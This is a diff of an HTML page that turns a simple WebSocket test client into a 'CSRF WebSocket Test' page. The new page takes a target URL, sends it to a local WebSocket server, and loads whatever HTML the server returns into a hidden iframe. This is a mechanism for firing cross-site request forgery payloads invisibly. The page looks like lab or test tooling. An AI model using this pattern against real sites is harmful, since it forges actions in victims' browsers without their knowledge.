@@ -3,29 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebSocket Test</title>
+    <title>CSRF WebSocket Test</title>
 </head>
 <body>
-    <h1>WebSocket Test</h1>
-    <input type="text" id="commandInput" placeholder="Enter command">
-    <button onclick="sendCommand()">Send Command</button>
-    <div id="output"></div>
+    <h1>WebSocket CSRF Test</h1>
+    <input type="text" id="targetUrl" placeholder="Enter target URL">
+    <button onclick="sendCSRF()">Send CSRF</button>
+
     <script>
-        const ws = new WebSocket('ws://localhost:3000');
+        const socket = new WebSocket('ws://localhost:3000');
 
-        ws.onopen = () => {
-            console.log('WebSocket is connected.');
-            ws.send('Hello Server!');
+        socket.onopen = function(event) {
+            console.log('Connected to WebSocket server');
         };
 
-        ws.onmessage = (event) => {
-            console.log(`Received: ${event.data}`);
-            document.getElementById('output').innerText = `Received: ${event.data}`;
+        socket.onmessage = function(event) {
+            const csrfPayload = event.data;
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.srcdoc = csrfPayload;
+            document.body.appendChild(iframe);
         };
 
-        function sendCommand() {
-            const command = document.getElementById('commandInput').value;
-            ws.send(command);
+        function sendCSRF() {
+            const targetUrl = document.getElementById('targetUrl').value;
+            socket.send(`command=csrf&targetUrl=${encodeURIComponent(targetUrl)}`);
         }
     </script>
 </body>
